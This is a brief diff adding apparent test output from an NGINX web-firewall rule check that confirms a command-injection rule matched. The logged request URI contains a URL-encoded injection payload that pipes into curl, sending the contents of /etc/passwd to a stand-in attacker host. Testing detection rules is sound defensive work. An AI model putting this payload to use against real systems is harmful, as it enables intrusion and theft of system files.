@@ -1,0 +1,3 @@
+Expected Rule: [NGINX CMDi] Command injection via pipe
+Matched Rule: [NGINX CMDi] Command injection via pipe test_id=CMDI_CURL_001-1772268942704-46akch pattern_id=CMDI_CURL_001 uri=/?q=%7Ccurl%20http%3A%2F%2Fevil.com%2Fexfil%3Fd%3D%24%28cat%20%2Fetc%2Fpasswd%29 client=127.0.0.1
+Rule Match: ✅ Match
